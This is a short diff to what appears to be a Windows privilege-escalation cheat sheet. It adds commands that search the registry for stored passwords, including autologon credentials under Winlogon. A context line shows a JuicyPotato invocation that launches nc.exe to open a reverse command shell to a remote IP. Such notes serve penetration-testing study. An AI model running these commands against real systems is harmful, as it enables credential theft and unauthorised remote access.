@@ -73,6 +73,14 @@ Or using a different CLSID:
 > JuicyPotato.exe -l 80 -p c:\cmd.exe -a "/c c:\nc.exe -e cmd.exe 192.168.1.1 80" -c {03ca98d6-ff5d-49b8-abc6-03dd84127020} -t *
 ```
 
+###### Autologon Credentials in registry
+```
+search for "Password" string:
+> reg query HKLM /f Password /t Reg_SZ /s
+query the specific registry entry (example):
+> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+```
+
 ###### RunAs
 ###### Registry Tricks
 ###### AlwaysInstallElevated
